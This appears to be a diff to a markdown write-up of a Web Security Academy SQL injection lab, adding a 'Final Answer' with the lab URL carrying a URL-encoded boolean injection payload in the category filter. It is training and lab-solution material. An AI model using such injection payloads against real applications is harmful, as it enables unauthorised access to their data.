@@ -71,3 +71,14 @@ Test how the application handles boolean conditions to manipulate the response.
   ```
 - **URL-encode** the payload (e.g., `Gifts%27%7C%7C1%7C%7C%27`).
 - Submit the request in Repeater.
+
+---
+
+---
+
+## Final Answer
+The final payload used to URL:
+
+```json
+https://0aab00b60392d9b780f21c7500f30044.web-security-academy.net/filter?category=Gifts%27||1||%27
+```
